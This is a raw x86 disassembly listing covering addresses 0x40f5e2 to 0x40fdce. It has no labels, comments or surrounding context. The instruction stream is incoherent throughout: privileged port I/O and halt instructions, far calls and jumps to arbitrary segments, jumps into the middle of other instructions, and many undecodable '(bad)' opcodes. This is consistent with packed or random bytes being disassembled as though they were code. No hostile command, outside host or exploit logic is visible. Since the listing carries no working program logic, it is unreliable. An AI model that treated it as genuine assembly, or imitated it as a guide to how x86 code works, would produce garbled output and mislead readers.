  40f5e2:	arpl   WORD PTR [esi+0x5a9364dd],cx
  40f5e8:	lock push ebp
  40f5ea:	std    
  40f5eb:	imul   esi,DWORD PTR [edi+0x2e07a8c2],0x0
  40f5f2:	sbb    DWORD PTR [ebp-0x508c9f32],0x930d654d
  40f5fc:	and    al,0x32
  40f5fe:	inc    edi
  40f5ff:	and    ah,al
  40f601:	adc    ebx,DWORD PTR [eax]
  40f603:	shl    BYTE PTR [edx-0x5825245e],1
  40f609:	adc    ah,BYTE PTR [esi-0x7084e587]
  40f60f:	test   edi,edx
  40f611:	jb     0x40f640
  40f613:	and    eax,0xbe3ad580
  40f618:	in     eax,0xd1
  40f61a:	ja     0x40f5c4
  40f61c:	hlt    
  40f61d:	push   ds
  40f61e:	cdq    
  40f61f:	cs inc ecx
  40f621:	or     esi,DWORD PTR [edx]
  40f623:	dec    ebp
  40f624:	inc    ebp
  40f625:	cmp    BYTE PTR [edx-0x1a20ea98],cl
  40f62b:	lock pop ecx
  40f62d:	repz ja 0x40f609
  40f630:	retf   
  40f631:	sbb    esi,DWORD PTR [ebp-0x65595cd1]
  40f637:	or     ch,ah
  40f639:	aam    0x2b
  40f63b:	cs inc ebp
  40f63d:	pop    es
  40f63e:	mov    ebx,DWORD PTR [edi-0x3a]
  40f641:	add    al,0xb5
  40f643:	aam    0x2c
  40f645:	add    eax,0xc234d5ba
  40f64a:	pop    es
  40f64b:	add    al,0xb8
  40f64d:	or     edx,edx
  40f64f:	dec    edx
  40f650:	and    cl,BYTE PTR [edx]
  40f652:	(bad)  
  40f653:	dec    edx
  40f654:	mov    dl,BYTE PTR [eax-0x34]
  40f657:	jns    0x40f6ab
  40f659:	adc    al,0xda
  40f65b:	mov    ds:0x3e31e680,eax
  40f660:	loopne 0x40f6c4
  40f662:	je     0x40f699
  40f664:	cmp    DWORD PTR ds:0x3000918f,ebp
  40f66a:	lods   al,BYTE PTR ds:[esi]
  40f66b:	push   ebp
  40f66c:	dec    esp
  40f66d:	mov    ch,0x25
  40f66f:	hlt    
  40f670:	out    0xe6,eax
  40f672:	jno    0x40f66e
  40f674:	jle    0x40f6ee
  40f676:	adc    DWORD PTR [ebp+0x1e351c76],esi
  40f67c:	adc    eax,0x89b95fad
  40f681:	scas   eax,DWORD PTR es:[edi]
  40f682:	pusha  
  40f683:	adc    BYTE PTR gs:[esi+eiz*8+0x3e],bl
  40f688:	call   FWORD PTR [ebx+0x4d7562e6]
  40f68e:	xor    ecx,DWORD PTR [eax+ecx*4+0x27]
  40f692:	and    DWORD PTR [ebx-0x457cb535],eax
  40f698:	mov    ebp,DWORD PTR [ecx+ebx*1-0xbd9626]
  40f69f:	je     0x40f630
  40f6a1:	mov    ebp,esi
  40f6a3:	sbb    BYTE PTR [edi+0x78c6ebeb],0x5f
  40f6aa:	push   edi
  40f6ab:	inc    esi
  40f6ac:	lock fwait
  40f6ae:	test   eax,0x4e602dd5
  40f6b3:	jo     0x40f6d2
  40f6b5:	out    dx,al
  40f6b6:	adc    eax,eax
  40f6b8:	repnz xor esp,DWORD PTR [eax-0xf50ec0c]
  40f6bf:	bound  esi,QWORD PTR [ebx-0x44ade68f]
  40f6c5:	sbb    edx,edi
  40f6c7:	or     ebx,DWORD PTR [ebx+0x261a7ed3]
  40f6cd:	pop    ebx
  40f6ce:	sbb    bl,BYTE PTR [edi+0x740179a5]
  40f6d4:	jbe    0x40f690
  40f6d6:	pop    ss
  40f6d7:	out    dx,al
  40f6d8:	jno    0x40f6f2
  40f6da:	clc    
  40f6db:	mov    ecx,0x35edd0d1
  40f6e0:	inc    esi
  40f6e1:	pop    ss
  40f6e2:	das    
  40f6e3:	xchg   esp,eax
  40f6e4:	fst    DWORD PTR [edi-0x77b815d4]
  40f6ea:	mov    eax,ds:0x66b5cbd5
  40f6ef:	pop    ebx
  40f6f0:	lods   eax,DWORD PTR ds:[esi]
  40f6f1:	(bad)  
  40f6f2:	fmul   st(4),st
  40f6f4:	daa    
  40f6f5:	push   0xffffffaf
  40f6f7:	nop
  40f6f8:	in     al,0x48
  40f6fa:	inc    ebx
  40f6fb:	mov    edi,0xa9c1cafb
  40f700:	pop    eax
  40f701:	in     eax,dx
  40f702:	inc    ebp
  40f703:	call   0x51413c47
  40f708:	push   ebx
  40f709:	xor    eax,0x7113ccb9
  40f70e:	sub    eax,0x186bae68
  40f713:	xlat   BYTE PTR ds:[ebx]
  40f714:	aam    0x64
  40f716:	sahf   
  40f717:	rcr    ecx,0xd0
  40f71a:	nop
  40f71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f71c:	sahf   
  40f71d:	sbb    ch,cl
  40f71f:	mov    esp,0x3f603095
  40f724:	lea    ecx,[esi+0x221a620c]
  40f72a:	sbb    al,0xb4
  40f72c:	inc    edx
  40f72d:	or     BYTE PTR [ebx+0x77],dl
  40f730:	dec    eax
  40f731:	mov    fs,WORD PTR ds:0xbcc17b3d
  40f737:	fwait
  40f738:	cwde   
  40f739:	push   0xffffffc2
  40f73b:	popa   
  40f73c:	mov    WORD PTR [ecx-0x71],gs
  40f73f:	cli    
  40f740:	stos   DWORD PTR es:[edi],eax
  40f741:	loopne 0x40f7b5
  40f743:	push   esp
  40f744:	or     eax,0xe5881eda
  40f749:	ror    dl,0x7
  40f74c:	and    edi,DWORD PTR [ebx+0x1cf6c479]
  40f752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f753:	mov    eax,0x93d8a895
  40f758:	jo     0x40f7a7
  40f75a:	js     0x40f6fe
  40f75c:	stos   DWORD PTR es:[edi],eax
  40f75d:	aam    0x23
  40f75f:	out    0xe7,al
  40f761:	push   ss
  40f762:	inc    esi
  40f763:	and    ecx,DWORD PTR [esi+0x3e3c9b13]
  40f769:	ds out 0x72,eax
  40f76c:	xor    al,0x88
  40f76e:	adc    dl,BYTE PTR [ebx]
  40f770:	(bad)  
  40f771:	jmp    0x309a4186
  40f776:	shl    BYTE PTR [edi],1
  40f778:	lods   al,BYTE PTR ds:[esi]
  40f779:	int    0x63
  40f77b:	popa   
  40f77c:	into   
  40f77d:	pop    ecx
  40f77e:	in     al,0x44
  40f780:	xchg   edi,eax
  40f781:	inc    eax
  40f782:	rol    BYTE PTR [eax+0x91bc978],1
  40f788:	ins    BYTE PTR es:[edi],dx
  40f789:	out    0xe5,al
  40f78b:	test   dh,al
  40f78d:	mov    ebx,0xb43fd671
  40f792:	mov    al,ds:0x3327331e
  40f797:	retf   0xd5d
  40f79a:	aad    0x41
  40f79c:	push   ss
  40f79d:	mov    ds:0xc41cc947,al
  40f7a2:	xor    BYTE PTR [edx],ch
  40f7a4:	cmp    BYTE PTR [edx+0x280623cc],dl
  40f7aa:	idiv   BYTE PTR [eax]
  40f7ac:	dec    edx
  40f7ad:	dec    esp
  40f7ae:	pusha  
  40f7af:	jne    0x40f76f
  40f7b1:	dec    eax
  40f7b2:	mov    esi,0xc78cf042
  40f7b7:	push   0x17
  40f7b9:	retf   
  40f7ba:	add    dh,dh
  40f7bc:	call   0xed58:0xdc3cf47
  40f7c3:	sbb    al,0x52
  40f7c5:	sbb    DWORD PTR [ebx],edx
  40f7c7:	shl    DWORD PTR ds:0x3b59878c,0xc7
  40f7ce:	faddp  st(3),st
  40f7d0:	shl    BYTE PTR [edi-0x644761d2],1
  40f7d6:	stos   BYTE PTR es:[edi],al
  40f7d7:	push   es
  40f7d8:	xor    BYTE PTR [ecx+0x300bf7b7],dh
  40f7de:	pusha  
  40f7df:	mov    cl,0x5f
  40f7e1:	data16 (bad) [esi-0x1e6a299b]
  40f7e8:	cmp    edi,esp
  40f7ea:	daa    
  40f7eb:	or     BYTE PTR [ebp-0x31c90993],0x6
  40f7f2:	cmp    BYTE PTR [ebx+0xd],cl
  40f7f5:	jno    0x40f7c6
  40f7f7:	sbb    BYTE PTR [edi*4-0x68d5e933],bh
  40f7fe:	inc    edx
  40f7ff:	jmp    0x6571:0xfb00bb8b
  40f806:	rcr    DWORD PTR [edx+0x73839716],1
  40f80c:	cli    
  40f80d:	aaa    
  40f80e:	data16 out 0xaf,al
  40f811:	retf   0x3fe9
  40f814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f815:	xor    esp,DWORD PTR [ecx]
  40f817:	lahf   
  40f818:	aaa    
  40f819:	ret    
  40f81a:	je     0x40f885
  40f81c:	int    0x12
  40f81e:	push   edx
  40f81f:	clc    
  40f820:	jp     0x40f837
  40f822:	stos   DWORD PTR es:[edi],eax
  40f823:	mov    edi,0x4f173d39
  40f828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f829:	push   edx
  40f82a:	mov    ebx,0xb27e67ca
  40f82f:	adc    al,0x2
  40f831:	stos   BYTE PTR es:[edi],al
  40f832:	push   esi
  40f833:	jmp    0x40f7b6
  40f835:	jg     0x40f81c
  40f837:	mov    bl,0xdc
  40f839:	mov    cl,0xa4
  40f83b:	adc    DWORD PTR [ecx],ecx
  40f83d:	or     BYTE PTR [ebp-0x5e],al
  40f840:	repz aam 0x73
  40f843:	dec    eax
  40f845:	nop
  40f846:	lods   al,BYTE PTR ds:[esi]
  40f847:	xchg   ebx,eax
  40f848:	fisttp WORD PTR [ebx-0x21029c6c]
  40f84e:	mov    dh,0xfb
  40f850:	sub    eax,0x22aac71b
  40f855:	sub    eax,0xfaf14ddf
  40f85a:	cmp    DWORD PTR [ebx-0x53],edi
  40f85d:	ror    DWORD PTR [edi],1
  40f85f:	mov    ebp,0x754f44fc
  40f864:	hlt    
  40f865:	mov    DWORD PTR [edx],esp
  40f867:	xor    DWORD PTR cs:[ebx+0x34df28bb],esp
  40f86e:	add    dh,al
  40f870:	push   ebx
  40f871:	fmulp  st(7),st
  40f873:	stos   DWORD PTR es:[edi],eax
  40f874:	nop
  40f875:	gs test esi,esp
  40f878:	xlat   BYTE PTR ds:[ebx]
  40f879:	push   ebp
  40f87a:	mov    al,0x1f
  40f87c:	inc    ecx
  40f87d:	mov    esi,0xf78f13cf
  40f882:	add    al,0x7e
  40f884:	ja     0x40f8e5
  40f886:	jbe    0x40f8a7
  40f888:	sub    bl,ah
  40f88a:	inc    ebp
  40f88b:	scas   al,BYTE PTR es:[edi]
  40f88c:	ins    DWORD PTR es:[edi],dx
  40f88d:	popa   
  40f88e:	dec    ebx
  40f88f:	lods   al,BYTE PTR ds:[esi]
  40f890:	ret    
  40f891:	leave  
  40f892:	stos   BYTE PTR es:[edi],al
  40f893:	out    0xb7,eax
  40f895:	inc    ebp
  40f896:	hlt    
  40f897:	xchg   esi,eax
  40f898:	push   edi
  40f899:	sbb    bl,BYTE PTR [ecx]
  40f89b:	jbe    0x40f839
  40f89d:	aam    0xd8
  40f89f:	clc    
  40f8a0:	push   ss
  40f8a1:	add    esp,ecx
  40f8a3:	push   es
  40f8a4:	fisub  WORD PTR [edi+0x30]
  40f8a7:	addr16 dec edi
  40f8a9:	add    ecx,DWORD PTR [ebx+0x6]
  40f8ac:	jne    0x40f8ed
  40f8ae:	lea    esi,[eax-0x1b170cff]
  40f8b4:	xchg   esp,eax
  40f8b5:	sbb    ch,BYTE PTR [eax+0x0]
  40f8b8:	sub    DWORD PTR [esi+0x32c248c6],0xffffffbe
  40f8bf:	out    dx,al
  40f8c0:	jg     0x40f878
  40f8c2:	mul    BYTE PTR fs:[esi]
  40f8c5:	pop    ss
  40f8c6:	repnz push esp
  40f8c8:	(bad)  
  40f8c9:	cmp    eax,0xf469823a
  40f8ce:	adc    BYTE PTR [ebp+0x2f3beecc],0x8b
  40f8d5:	jbe    0x40f8fe
  40f8d7:	push   esp
  40f8d8:	loopne 0x40f89d
  40f8da:	add    eax,0x68ed2f16
  40f8df:	je     0x40f8ea
  40f8e1:	push   0x10
  40f8e3:	adc    al,0x8e
  40f8e5:	std    
  40f8e6:	mov    bl,bl
  40f8e8:	jae    0x40f8aa
  40f8ea:	nop
  40f8eb:	cmp    edx,DWORD PTR [ecx+0xc]
  40f8ee:	pushf  
  40f8ef:	dec    ecx
  40f8f0:	mov    esi,DWORD PTR [eax]
  40f8f2:	jb     0x40f92e
  40f8f4:	sub    ch,BYTE PTR [ecx-0x123089e0]
  40f8fa:	jmp    0x40f89f
  40f8fc:	xor    dl,BYTE PTR [edi+0x4567fe8a]
  40f902:	repnz outs dx,DWORD PTR ds:[esi]
  40f904:	push   eax
  40f905:	jo     0x40f908
  40f907:	pop    ecx
  40f908:	hlt    
  40f909:	dec    edi
  40f90a:	fst    DWORD PTR [edi]
  40f90c:	xchg   ecx,eax
  40f90d:	add    esi,DWORD PTR [ebx-0x28]
  40f910:	fnstcw WORD PTR ds:0x9120f52e
  40f916:	sbb    eax,0xce275a65
  40f91b:	(bad)  
  40f91d:	les    esp,FWORD PTR [esi+eiz*1-0x345b9052]
  40f924:	add    BYTE PTR [edx+0x58afe858],ch
  40f92a:	and    al,0x34
  40f92c:	inc    edi
  40f92d:	shl    DWORD PTR [edi-0x7ad37c5a],1
  40f933:	fisttp DWORD PTR [eax+0x51]
  40f936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f937:	fcom   DWORD PTR [edx]
  40f939:	cmp    edi,esp
  40f93b:	cmp    bl,BYTE PTR [ebx-0x672d3905]
  40f941:	push   0xfffffff7
  40f943:	jle    0x40f907
  40f945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f946:	push   eax
  40f947:	push   cs
  40f948:	sbb    al,0x3a
  40f94a:	ret    
  40f94b:	hlt    
  40f94c:	adc    al,0xb0
  40f94e:	rol    ch,1
  40f950:	psadbw mm0,mm2
  40f953:	mov    edi,DWORD PTR [ebx]
  40f955:	pop    ebp
  40f956:	mov    ebx,0x47b8ed35
  40f95b:	sbb    bh,bh
  40f95d:	std    
  40f95e:	dec    eax
  40f95f:	xchg   esi,eax
  40f960:	cld    
  40f961:	in     eax,0xdc
  40f963:	out    0x1a,eax
  40f965:	popa   
  40f966:	add    bl,dh
  40f968:	mov    ah,0xac
  40f96a:	adc    dl,BYTE PTR ds:0x8b79b2db
  40f970:	adc    DWORD PTR [edx],edx
  40f972:	out    0x7a,eax
  40f974:	push   ds
  40f975:	mov    WORD PTR [esi],ss
  40f977:	mov    ebp,?
  40f979:	push   edx
  40f97a:	push   ss
  40f97b:	mov    ds:0xf33a9570,al
  40f980:	imul   eax,DWORD PTR [eax],0x1da43df1
  40f986:	sbb    ch,0x1c
  40f989:	sbb    ch,BYTE PTR [ebx-0x17]
  40f98c:	loopne 0x40f9b1
  40f98e:	xchg   ebp,eax
  40f98f:	aam    0x74
  40f991:	imul   BYTE PTR cs:[ecx+0x20]
  40f995:	lods   al,BYTE PTR ds:[esi]
  40f996:	icebp  
  40f997:	pop    ds
  40f998:	arpl   WORD PTR ds:0x6c301f41,cx
  40f99e:	sub    dl,0x8a
  40f9a1:	push   esi
  40f9a2:	mov    dh,0x7d
  40f9a4:	push   edi
  40f9a5:	pop    esp
  40f9a6:	dec    ecx
  40f9a7:	xchg   esp,eax
  40f9a8:	leave  
  40f9a9:	bound  ecx,QWORD PTR [ecx]
  40f9ab:	cmp    cl,bl
  40f9ad:	shr    BYTE PTR [eax],0xaa
  40f9b0:	mov    BYTE PTR [edx+edx*8+0x23],dl
  40f9b4:	pop    edx
  40f9b5:	sbb    ecx,DWORD PTR [eax]
  40f9b7:	xchg   edx,eax
  40f9b8:	stc    
  40f9b9:	rol    DWORD PTR [eax+edi*4+0x68],0xf
  40f9be:	fidivr WORD PTR [edx+ebx*2+0x2b]
  40f9c2:	jo     0x40fa19
  40f9c4:	pop    ecx
  40f9c5:	add    al,0x52
  40f9c7:	inc    edx
  40f9c8:	sub    BYTE PTR es:[edi-0x3a98f9f2],dl
  40f9cf:	call   0xb8ccda04
  40f9d4:	out    0x94,al
  40f9d6:	fwait
  40f9d7:	xchg   ebp,eax
  40f9d8:	neg    BYTE PTR [edx-0x3298da5e]
  40f9de:	mov    ebx,0xcb26c073
  40f9e3:	fdivr  DWORD PTR es:[eax+0x11]
  40f9e7:	adc    DWORD PTR [ebp+0x5a80be12],edi
  40f9ed:	mov    ebx,0xff361843
  40f9f2:	jno    0x40fa11
  40f9f4:	push   es
  40f9f5:	clc    
  40f9f6:	jle    0x40f9ba
  40f9f8:	out    dx,al
  40f9f9:	(bad)  
  40f9fa:	jge    0x40f9e9
  40f9fc:	std    
  40f9fd:	rol    ebx,cl
  40f9ff:	cld    
  40fa00:	cwde   
  40fa01:	push   cs
  40fa02:	inc    esp
  40fa03:	icebp  
  40fa04:	jl     0x40fa66
  40fa06:	test   BYTE PTR [edi+0x232f634],dl
  40fa0c:	test   DWORD PTR [esi-0x1f],ecx
  40fa0f:	test   al,0xfb
  40fa11:	inc    edi
  40fa12:	leave  
  40fa13:	out    0xb3,eax
  40fa15:	fisub  WORD PTR [edi+esi*1+0x78]
  40fa19:	daa    
  40fa1a:	outs   dx,DWORD PTR ds:[esi]
  40fa1b:	push   edi
  40fa1c:	adc    DWORD PTR [esi+0x3fc4c332],edi
  40fa22:	iret   
  40fa23:	das    
  40fa24:	push   esi
  40fa25:	imul   edi,DWORD PTR [ecx+0x14],0x50
  40fa29:	dec    eax
  40fa2a:	(bad)  [edi-0x1c]
  40fa2d:	loop   0x40fa90
  40fa2f:	stc    
  40fa30:	fdivr  DWORD PTR [ecx-0x76]
  40fa33:	les    edx,FWORD PTR [edi+edi*2-0x4017f699]
  40fa3a:	fdiv   DWORD PTR [ebp-0x67]
  40fa3d:	ficom  DWORD PTR [ebx+ecx*8+0x507f6bbc]
  40fa44:	push   eax
  40fa45:	lock dec esi
  40fa47:	es retf 0x9a72
  40fa4b:	jae    0x40f9eb
  40fa4d:	mov    eax,0x5c6b8f5a
  40fa52:	not    BYTE PTR [ebx+eiz*2]
  40fa55:	pop    ebx
  40fa56:	mov    eax,0x79e160b
  40fa5b:	dec    ecx
  40fa5c:	call   0x2bd0:0x67d73f3e
  40fa63:	xchg   ebx,eax
  40fa64:	js     0x40fa87
  40fa66:	push   0x3b
  40fa68:	shl    BYTE PTR [eax+0x3b32ff1],0x10
  40fa6f:	shr    DWORD PTR ds:0xfba20885,1
  40fa75:	test   eax,0xda462a78
  40fa7a:	mov    bl,BYTE PTR [edx+0x676c4328]
  40fa80:	jecxz  0x40fa83
  40fa82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa83:	inc    eax
  40fa84:	mov    cl,0xc
  40fa86:	bound  edx,QWORD PTR [esp+esi*4+0x30433f15]
  40fa8d:	inc    edi
  40fa8e:	pop    edx
  40fa8f:	add    BYTE PTR [edi-0x5f],dl
  40fa92:	aad    0xbc
  40fa94:	(bad)  
  40fa95:	push   ds
  40fa96:	or     DWORD PTR [edi],0x4c
  40fa99:	aad    0x17
  40fa9b:	sbb    al,BYTE PTR [esi]
  40fa9d:	inc    ebp
  40fa9e:	cdq    
  40fa9f:	cmp    al,0xbc
  40faa1:	clc    
  40faa2:	xchg   ebx,eax
  40faa3:	mov    ah,0x28
  40faa5:	xchg   ebp,eax
  40faa6:	sbb    ecx,DWORD PTR [ecx-0x31]
  40faa9:	sbb    al,0x72
  40faab:	in     eax,dx
  40faac:	fild   DWORD PTR [eax-0x57]
  40faaf:	test   eax,0x18293090
  40fab5:	outs   dx,BYTE PTR ds:[esi]
  40fab6:	test   dh,cl
  40fab8:	xor    bh,BYTE PTR [edi-0xd]
  40fabb:	ror    BYTE PTR [edi],0x46
  40fabe:	aas    
  40fabf:	jns    0x40fad6
  40fac1:	and    al,0xd5
  40fac3:	jae    0x40fb2a
  40fac5:	stc    
  40fac6:	sub    BYTE PTR [eax-0x6b9dc382],bl
  40facc:	call   0x4065:0x75278f09
  40fad3:	icebp  
  40fad4:	adc    dl,dh
  40fad6:	fnstcw WORD PTR [esi]
  40fad8:	push   edx
  40fad9:	std    
  40fada:	sbb    DWORD PTR [ebx-0x7b],0xffffffe5
  40fade:	outs   dx,DWORD PTR ds:[esi]
  40fadf:	pop    ebx
  40fae0:	or     al,0xf0
  40fae2:	sub    eax,0xe4513f3b
  40fae7:	cmc    
  40fae8:	dec    ebp
  40fae9:	push   edx
  40faea:	rcr    bh,1
  40faec:	and    al,0x2f
  40faee:	sbb    eax,0x80cefe5f
  40faf3:	sub    DWORD PTR [edi-0x2f90a09a],ebx
  40faf9:	adc    BYTE PTR [edi-0x7b],cl
  40fafc:	xor    eax,0xcc472d20
  40fb01:	ds mov edi,0xb8b74ad1
  40fb07:	dec    edx
  40fb08:	add    al,0xa8
  40fb0a:	and    BYTE PTR [ebx+0x4d],al
  40fb0d:	sub    DWORD PTR [edx],ebp
  40fb0f:	hlt    
  40fb10:	xor    esi,ebx
  40fb12:	mov    edx,0x77addd05
  40fb17:	pop    ss
  40fb18:	sub    DWORD PTR [ebx],ebp
  40fb1a:	hlt    
  40fb1b:	in     al,dx
  40fb1c:	mov    ah,BYTE PTR [eax+0x72]
  40fb1f:	ins    BYTE PTR es:[edi],dx
  40fb20:	mov    ch,0x3
  40fb22:	js     0x40fb62
  40fb24:	popf   
  40fb25:	into   
  40fb26:	shr    edi,cl
  40fb28:	lea    ecx,[edx+0x44c1adaf]
  40fb2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb2f:	xchg   edx,eax
  40fb30:	add    BYTE PTR [esi],ah
  40fb32:	popa   
  40fb33:	xchg   ebx,eax
  40fb34:	cmp    DWORD PTR [edi],0x3a
  40fb37:	(bad)  
  40fb38:	mov    ds:0x91d71836,al
  40fb3d:	shr    bl,1
  40fb3f:	add    ebp,esi
  40fb41:	mov    bl,0x40
  40fb43:	adc    al,0xfe
  40fb45:	cmc    
  40fb46:	xor    BYTE PTR [edx],bh
  40fb48:	das    
  40fb49:	(bad)  
  40fb4a:	imul   esi,DWORD PTR [ecx-0x3],0xaa2b58e0
  40fb51:	sahf   
  40fb52:	pusha  
  40fb53:	sub    BYTE PTR ds:0xde80dfaf,ah
  40fb59:	or     ah,ch
  40fb5b:	(bad)  
  40fb5c:	cmc    
  40fb5d:	push   esp
  40fb5e:	and    al,0x3b
  40fb60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb62:	punpckhwd mm0,QWORD PTR [edi+0x54]
  40fb66:	sub    DWORD PTR [edi+0x13dde2c5],eax
  40fb6c:	xchg   edx,eax
  40fb6d:	arpl   di,dx
  40fb6f:	jp     0x40fb5b
  40fb71:	pop    edi
  40fb72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb73:	inc    ebx
  40fb74:	pop    ds
  40fb75:	inc    ecx
  40fb76:	dec    ebx
  40fb77:	mov    dh,0xe5
  40fb79:	inc    esi
  40fb7a:	pop    ebx
  40fb7b:	mov    al,0xc9
  40fb7d:	not    ebp
  40fb7f:	shl    BYTE PTR [ebp+0x7b],1
  40fb82:	stos   DWORD PTR es:[edi],eax
  40fb83:	ror    ebx,cl
  40fb85:	retf   
  40fb86:	rcr    DWORD PTR [eax+0x3a],0x1a
  40fb8a:	mul    DWORD PTR [edi+eiz*2+0x64]
  40fb8e:	add    esi,DWORD PTR [ecx-0x6bb1ee67]
  40fb94:	ret    
  40fb95:	jno    0x40fba3
  40fb97:	clc    
  40fb98:	daa    
  40fb99:	inc    esp
  40fb9a:	(bad)  
  40fb9b:	mov    cl,0x29
  40fb9d:	imul   esi,edx,0xffffffd3
  40fba0:	in     eax,dx
  40fba1:	mov    al,ds:0x3a9fe344
  40fba6:	mov    eax,0x7fb262b2
  40fbab:	jmp    0xc991a913
  40fbb0:	cli    
  40fbb1:	pop    esi
  40fbb2:	or     BYTE PTR [ebx],0xb5
  40fbb5:	push   edx
  40fbb6:	mov    ebx,0x3a12a099
  40fbbb:	(bad)  
  40fbbc:	xor    BYTE PTR [eax-0x623b7cb2],al
  40fbc2:	mov    ds:0xcf3ad4a4,eax
  40fbc7:	(bad)  
  40fbc8:	dec    ebp
  40fbc9:	jp     0x40fb9d
  40fbcb:	div    eax
  40fbcd:	mov    cl,0x3b
  40fbcf:	sbb    al,0x67
  40fbd1:	mov    ch,ch
  40fbd3:	mov    dl,0x81
  40fbd5:	push   ebp
  40fbd6:	aas    
  40fbd7:	mov    edi,0x732bd106
  40fbdc:	data16 mov ah,0xb9
  40fbdf:	jecxz  0x40fbf4
  40fbe1:	cmp    eax,0xe28d39b8
  40fbe6:	repz stc 
  40fbe8:	lea    edi,[esi+0x6c0ce89]
  40fbee:	add    eax,0xf1a6fb05
  40fbf3:	in     al,dx
  40fbf4:	sub    DWORD PTR [ebx+0x74],0x7df0791
  40fbfb:	fs mov ch,0x7f
  40fbfe:	and    ch,BYTE PTR [ebp-0x48]
  40fc01:	pop    edx
  40fc02:	mov    ebx,0x704e7cf4
  40fc07:	imul   ecx,DWORD PTR ds:0x3f9b42c1,0xe3ad3bff
  40fc11:	add    ebp,DWORD PTR ds:0x62439412
  40fc17:	loopne 0x40fbf9
  40fc19:	div    DWORD PTR [ebp+0x132a565b]
  40fc1f:	push   edx
  40fc20:	sahf   
  40fc21:	sbb    edx,DWORD PTR [eax]
  40fc23:	imul   ecx,DWORD PTR [ebp+0x2b],0xffffff83
  40fc27:	js     0x40fc58
  40fc29:	lahf   
  40fc2a:	cmp    ah,BYTE PTR [ecx]
  40fc2c:	ret    0x4361
  40fc2f:	jb     0x40fc59
  40fc31:	push   cs
  40fc32:	cmp    eax,0x3be5b6fb
  40fc37:	popa   
  40fc38:	jg     0x40fcac
  40fc3a:	jne    0x40fc20
  40fc3c:	sub    esp,DWORD PTR [ecx+0x25]
  40fc3f:	mov    al,cs:0x741e2a5b
  40fc45:	mov    esp,0x80b8f2ff
  40fc4a:	push   ss
  40fc4b:	xchg   ebx,eax
  40fc4c:	aas    
  40fc4d:	cmp    esi,DWORD PTR [edx+0x4e]
  40fc50:	dec    ebp
  40fc51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc52:	sub    al,0x39
  40fc54:	jg     0x40fc51
  40fc56:	adc    DWORD PTR [edx+edi*8-0x6f9ee3dc],ebp
  40fc5d:	push   edi
  40fc5e:	and    DWORD PTR [edx+0xe],ecx
  40fc61:	or     eax,0xcf6ccff2
  40fc66:	adc    DWORD PTR [edi+0x3e315a07],esp
  40fc6c:	mov    ebx,0xe4675d21
  40fc71:	mov    ds:0xd691c00,eax
  40fc76:	loope  0x40fc3b
  40fc78:	pop    ebp
  40fc79:	in     eax,0x84
  40fc7b:	in     eax,0x95
  40fc7d:	mov    dl,0x5
  40fc7f:	mov    eax,0x12b654a4
  40fc84:	out    dx,al
  40fc85:	adc    BYTE PTR [ebp+ebx*4+0x9],dl
  40fc89:	sub    DWORD PTR [ebp+ebp*8+0x33],eax
  40fc8d:	pop    ebx
  40fc8e:	inc    eax
  40fc8f:	pop    edx
  40fc90:	icebp  
  40fc91:	push   ebp
  40fc92:	mov    ds,edi
  40fc94:	jecxz  0x40fc36
  40fc96:	test   eax,0x70
	...
  40fd13:	add    ah,bl
  40fd15:	xor    DWORD PTR [eax-0x12402a6],edi
  40fd1b:	mov    bh,0xdd
  40fd1d:	xchg   edx,eax
  40fd1e:	iret   
  40fd1f:	mov    DWORD PTR [ecx-0x619c0dc],eax
  40fd25:	test   al,0x0
  40fd27:	add    BYTE PTR [edi+eax*1+0x0],ch
  40fd2b:	add    BYTE PTR [esi],bl
  40fd2d:	in     al,dx
  40fd2e:	mov    esi,0xcaba4b42
  40fd33:	pushf  
  40fd34:	sahf   
  40fd35:	jo     0x40fd38
  40fd37:	and    ah,BYTE PTR [esi+0x1f467bff]
  40fd3d:	popw   ss
  40fd3f:	xchg   edx,eax
  40fd40:	inc    edi
  40fd41:	mov    al,ds:0xae6ac402
  40fd46:	(bad)  
  40fd48:	ret    0x559
  40fd4b:	ret    
  40fd4c:	cmc    
  40fd4d:	repz jbe 0x40fd30
  40fd50:	and    al,0x10
  40fd52:	jg     0x40fd2d
  40fd54:	xor    BYTE PTR [eax+edx*1-0x45],bl
  40fd58:	ins    BYTE PTR es:[edi],dx
  40fd59:	gs jne 0x40fdc6
  40fd5c:	cmp    bh,BYTE PTR [esi-0x31]
  40fd5f:	jns    0x40fd3f
  40fd61:	xchg   esi,eax
  40fd62:	jg     0x40fdba
  40fd64:	stc    
  40fd65:	or     eax,0xf27139e1
  40fd6a:	and    esi,eax
  40fd6c:	and    eax,0x80f10e35
  40fd71:	stc    
  40fd72:	adc    eax,DWORD PTR [ecx]
  40fd74:	pushf  
  40fd75:	lea    ebp,[ecx+0x25]
  40fd78:	add    BYTE PTR [ebx+0x26a745af],bh
  40fd7e:	hlt    
  40fd7f:	(bad)  
  40fd80:	aas    
  40fd81:	dec    eax
  40fd82:	cdq    
  40fd83:	adc    ah,BYTE PTR [edx-0x35da6205]
  40fd89:	mov    esp,0x28be8e1
  40fd8e:	push   0x671e4c37
  40fd93:	fwait
  40fd94:	mov    esi,DWORD PTR [ecx+0x2abe3a22]
  40fd9a:	bound  ebp,QWORD PTR [ebx+ebx*2]
  40fd9d:	retf   0x7c3a
  40fda0:	inc    eax
  40fda1:	or     edi,ecx
  40fda3:	mov    esp,0x861952e
  40fda8:	aas    
  40fda9:	sub    DWORD PTR [eax-0x33],0x1e
  40fdad:	sbb    edx,DWORD PTR [ecx+0x28bcaa72]
  40fdb3:	or     DWORD PTR [ecx],0xdd70f4d1
  40fdb9:	fs stos BYTE PTR es:[edi],al
  40fdbb:	or     eax,0x3685f436
  40fdc0:	jmp    0x1e5bcbf5
  40fdc5:	xchg   ecx,eax
  40fdc6:	rol    BYTE PTR [edi+0x16aa16da],cl
  40fdcc:	jle    0x40fd51
  40fdce:	retf   
